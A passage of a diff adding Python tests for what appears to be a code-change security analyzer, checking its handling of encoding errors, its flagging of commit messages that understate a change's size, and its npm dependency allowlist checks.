+        assert text == "const check_\xe1 = 1;\n" and "not valid utf-8" in error
+        assert "unknown encoding" in _decode_source(b"# coding: no-such-codec\nx = 1\n", "a.py")[1]
+
+    def test_decode_errors_mark_the_parse_incomplete(self):
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas([
+            FileDeltaInput("api.py", change_type="M", base_source="def a():\n    pass\n",
+                           head_source="def a():\n    pass\n", head_decode_error="not valid utf-8"),
+            FileDeltaInput("ui.js", change_type="M", base_source="function a() {}\n",
+                           head_source="function a() {}\n", head_decode_error="not valid utf-8"),
+        ])
+        statuses = {f.affected_files[0]: (f.policy_recommendation, f.evidence[0].kind)
+                    for f in rep.findings if f.detector_id == DETECTOR_D01_PARSER}
+        assert statuses == {"api.py": (POLICY_REVIEW, PARSER_STATUS_PARSE_ERROR), "ui.js": (POLICY_WARN, "DECODE_ERROR")}
+
+    def test_declared_latin1_rename_is_a_rename(self, tmp_path):
+        base = "# -*- coding: latin-1 -*-\ndef check_\xe1(user):\n    return user\n".encode("latin-1")
+        head = "# -*- coding: latin-1 -*-\ndef check_(user):\n    return user\n".encode("latin-1")
+        root = _r3_repo(tmp_path, {"api.py": base}, lambda repo, root: _r3_stage(repo, root, {"api.py": head}))
+        ca = _r3_analyze(root, "enforce", "Rename the check")["consequence_analysis"]
+        assert ca["graph_summary"]["transition_counts"] == {"RENAMED": 1}
+        assert ca["parser_completeness"]["complete"] is True
+
+    def test_undeclared_latin1_python_is_a_head_parse_error(self, tmp_path):
+        head = b"def check_\xe1(user):\n    return user\n"
+        root = _r3_repo(tmp_path, {"api.py": "def check(user):\n    return user\n"},
+                        lambda repo, root: _r3_stage(repo, root, {"api.py": head}))
+        ca = _r3_analyze(root, "enforce", "Rename the check")["consequence_analysis"]
+        d01 = [f for f in ca["findings"] if f["detector_id"] == DETECTOR_D01_PARSER]
+        assert [f["policy_recommendation"] for f in d01] == [POLICY_REVIEW]
+        assert ca["parser_completeness"]["complete"] is False
+
+
+class TestRound3SemanticChurn:
+    """SEM-01/SEM-04: the L5b diff profiler measures the real patch, not zero churn."""
+
+    _GUIDE = "# Guide\n\nIntro.\n"
+
+    def _repo(self, tmp_path):
+        added = "".join(f"Step {i}: configure item {i}.\n" for i in range(120))
+        return _r3_repo(
+            tmp_path,
+            {"docs/guide.md": self._GUIDE},
+            lambda repo, root: _r3_stage(repo, root, {"docs/guide.md": self._GUIDE + added}),
+        )
+
+    def test_micro_claim_on_large_change_is_deceptive(self, tmp_path):
+        root = self._repo(tmp_path)
+        for mode in ("shadow", "advisory", "enforce"):
+            rep = _r3_analyze(root, mode, "minor typo fix")
+            sem = rep["semantic"]
+            assert sem["diff_reality"]["total_churn"] == rep["lines"]["added"] + rep["lines"]["deleted"] == 120
+            assert sem["status"] == "DECEPTIVE_PAYLOAD"
+            assert "scope_understated" in sem["signals"]
+            assert rep["verdict"]["status"] == "CAUTION"
+
+    def test_accurate_description_is_transparent(self, tmp_path):
+        root = self._repo(tmp_path)
+        rep = _r3_analyze(root, "shadow", "Add a 120-step configuration walkthrough to the guide")
+        assert rep["semantic"]["diff_reality"]["total_churn"] == 120
+        assert rep["semantic"]["status"] == "TRANSPARENT"
+        assert rep["verdict"]["status"] == "SAFE"
+
+    def test_added_declarations_are_counted(self, tmp_path):
+        base = '"""Report utilities."""\n'
+        head = base + "".join(f"\ndef report_{i}():\n    return {i}\n" for i in range(3))
+        root = _r3_repo(
+            tmp_path,
+            {"reporting.py": base},
+            lambda repo, root: _r3_stage(repo, root, {"reporting.py": head}),
+        )
+        rep = _r3_analyze(root, "shadow", "minor typo fix")
+        assert rep["semantic"]["diff_reality"]["structural_alterations"] == 3
+        assert "operation_mutation" in rep["semantic"]["signals"]
+
+
+class TestRound3PackageManifest:
+    """BUILD-07 and FP-01: an approved npm dependency on an active allowlist is not a finding."""
+
+    _BASE = json.dumps({"name": "demo", "version": "1.0.0", "description": "Plain ASCII package"}, indent=2) + "\n"
+
+    def test_approved_dependency_is_clean_and_safe(self, tmp_path):
+        head = json.dumps({
+            "name": "demo", "version": "1.0.0", "description": "Plain ASCII package",
+            "dependencies": {"approved": "^1.0.0"},
+        }, indent=2) + "\n"
+        root = _r3_repo(
+            tmp_path,
+            {"allowlist.yml": "npm:\n  - approved\n", "package.json": self._BASE},
+            lambda repo, root: _r3_stage(repo, root, {"package.json": head, "package-lock.json": "{}\n"}),
+        )
+        for mode in ("shadow", "advisory", "enforce"):
+            rep = _r3_analyze(root, mode, "Add the approved dependency")
+            assert rep["sca"]["status"] == "CLEAN"
+            assert rep["ai_config_poisoning"]["total"] == 0
+            assert rep["verdict"]["status"] == "SAFE"
+
+    def test_unapproved_dependency_is_the_only_flag(self, tmp_path):
+        head = json.dumps({
+            "name": "demo", "version": "1.0.0", "description": "Plain ASCII package",
+            "scripts": {"build": "tsc"},
+            "dependencies": {"approved": "^1.0.0", "unapproved": "^2.0.0"},
+        }, indent=2) + "\n"
+        root = _r3_repo(
+            tmp_path,
+            {"allowlist.yml": "npm:\n  - approved\n", "package.json": self._BASE},
+            lambda repo, root: _r3_stage(repo, root, {"package.json": head, "package-lock.json": "{}\n"}),
+        )
+        rep = _r3_analyze(root, "shadow", "Add dependencies")
+        assert [p["package"] for p in rep["sca"]["unverified_packages"]] == ["unapproved"]
+        assert rep["verdict"]["status"] == "CAUTION"
